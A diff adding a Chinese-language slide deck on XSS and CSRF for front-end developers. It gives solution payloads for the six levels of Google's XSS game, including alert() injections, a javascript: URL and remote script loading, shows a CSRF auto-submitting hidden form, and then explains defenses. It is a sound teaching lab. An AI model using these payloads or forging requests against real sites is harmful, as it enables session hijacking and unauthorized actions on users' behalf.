@@ -1,0 +1,196 @@
+XSS & CSRF
+前端安全简介
+24 Jul 2019
+.cover ./xss-csrf.png
+
+CJ Ting
+
+* XSS
+
+* 定义
+
+XSS 全称是 _Cross_Site_Script_，跨站点脚本，因为缩写和 CSS 重名，所以业界一般称为 XSS。
+
+简单来说：*在别人的网站执行任意*JS*。
+
+* 举个栗子
+
+一个典型的 _反射型_ XSS 漏洞。
+
+[[https://xss-doc.appspot.com/demo/2]]
+
+* 如果我是攻击者
+
+我该怎样利用这个漏洞？
+
+- 诱导用户访问我的网页，嵌入隐藏的 iframe
+- 直接构造相关 URL，诱导用户点击
+- ...
+
+上面列出的是最明显的方法，攻防领域不断在演进，这是一个技巧和智慧层出不迭的领域。
+
+* 执行任意 JS 有什么危害
+
+- 任意控制目标网站的行为
+- 窃取机密数据
+- 以用户的身份执行动作
+- ...
+
+* XSS Lab
+
+* Level 1
+
+[[https://xss-game.appspot.com/level1/frame]]
+
+* Level 1 Result
+
+可以看到，网站对于用户输入完全不做任何处理。
+
+  #lang html
+  <script>alert()</script>
+
+* Level 2
+
+[[https://xss-game.appspot.com/level2/frame]]
+
+* Level 2 Result
+
+这是一个典型的 _存储型_ XSS 漏洞。
+
+这里牵涉到一个 JS 的小知识，通过 `innerHTML` 添加的 script 标签不会得到执行。
+
+因此，我们需要使用别的标签来执行 JS，最方便的就是 img 标签。
+
+  #lang html
+  <img src="" onerror="alert()" />
+
+* Level 3
+
+[[https://xss-game.appspot.com/level3/frame]]
+
+* Level 3 Result
+
+这是第三种类型的 XSS，_DOM_ XSS。即完全不经过服务器，客户端代码直接从客户端取得输入。
+
+  #lang html
+  https://xss-game.appspot.com/level3/frame#3.jpg'%20onload=%22alert()%22%20abc='
+
+* Level 4
+
+[[https://xss-game.appspot.com/level4/frame]]
+
+* Level 4 Result
+
+这一关需要观察网页的特征，查看源代码。
+
+  #lang html
+  https://xss-game.appspot.com/level4/frame?timer=1%27)%3Balert(%27
+
+* Level 5
+
+[[https://xss-game.appspot.com/level5/frame]]
+
+* Level 5 Result
+
+同样需要研究源代码，寻找 XSS 漏洞。
+
+  #lang html
+  https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()
+
+* Level 6
+
+[[https://xss-game.appspot.com/level6/frame]]
+
+* Level 6 Result
+
+目标网站根据 URL 动态加载资源，虽然做了检查，但是百密一疏。
+
+  #lang html
+  https://xss-game.appspot.com/level6/frame#//pastebin.com/raw/ApUeAjZg
+
+* 防范
+
+防范 XSS 的一个重要方法就是 *Escape*，转义。
+
+*对于任何用户输入的内容，都要认为不安全*，并根据上下文进行转义。这是很繁重的工作，一般交给框架自动处理。
+
+其他一些措施：
+
+- 对于所有含有用户输入的页面，都需要正确指定 `Content-Type` 头。没有这个头，很多浏览器会自动猜测类型，这可能会导致将内容解释成 HTML，从而引发 XSS。
+- 对于所有用户提供的 URL，需要保证有正确的协议。恶意用户可能会使用 `javascript:` 来执行 JS。
+- 对于用户上传的东西，使用不同的域名来访问
+- ...
+
+* 推荐一个小工具
+
+XSS 很多时候攻击的一个要点是要绕过服务器的转义，因此，客户端转义就是一个很有效的手段。
+
+[[https://xssor.io]]
+
+* CSRF
+
+* 定义
+
+CSRF 全称是 _Cross-Site_Request_Forgery_，跨站点请求伪造。
+
+简单来说：*诱导用户在目标网站上执行非本意操作*。
+
+* 举个栗子
+
+某个银行网站 A 的转账使用 `GET`/send?target=&amount=` 接口，用户 B 已经登陆 A 网站。
+
+我们诱导用户 B 点击链接 `/send?target=me&amount=1000`，那么，在一切不知情的情况下，用户将损失 1000 元。
+
+或者，我们可以诱导用户访问某个页面，使用 `<img`src="/send?target=me&amount=1000"`/>`。
+
+又或者，我们可以给用户发送一封电子邮件，等等等等。
+
+* GET 换成 POST
+
+一般来说，操作资源的接口都是 POST，无法通过点击 URL 触发。
+
+不要紧，我们可以构造页面，使用 `form` 自动提交。
+
+  #lang html
+  <iframe style="display: none" name="iframe"></iframe>
+  <form action="https://www.baidu.com" method="post" target="iframe"></form>
+  <script type="text/javascript">
+    document.querySelector("form").submit()
+  </script>
+
+这里使用了 form 的 target 属性将结果显示在 iframe 中。
+
+怎样诱导用户进入这个页面是技术以外的问题了。
+
+* 防范
+
+CSRF 的本质是第三方触发了用户对于目标网站的请求，该请求会携带 Cookie 因此鉴权不会有问题，从而导致了非用户本意的行为。
+
+- Anti-Forgery Token: 确保这个请求确实来自于我们自己的网站
+- SameSite Cookie Attribute: 确保第三方站点的请求不会携带 Cookie
+
+* Anti-Forgery Token
+
+服务端在渲染网页时，会生成一个 Token，存放着页面中以及 Cookie 中。
+
+客户端在请求时，会携带这个 Token，服务端会校验，如果 Token 不匹配，说明该请求并非来自于我们自己的站点。
+
+这个方案简单有效，而且一般来说框架可以替我们透明处理掉。
+
+* SameSite Cookie Attribute
+
+Chrome 给 `Set-Cookie` 增加了一个新的属性 `SameSite`，取值如下：
+
+- `Strict`: 第三方域名发起的请求中将不会携带任何目标域名的 Cookie
+- `Lax`: GET 请求会携带，其他请求不会
+
+* 总结
+
+安全是非常复杂的问题，漏洞往往隐藏在细微之处。
+
+事发之前，都是岁月静好，一切正常。
+
+我们要做的就是
+
+- 坚持使用 Best Practices，一些最佳实践看起来可能有些冗余，但这一切背后都有原因
+- 不要偷懒，该转义的地方要转义，该校验的地方要校验
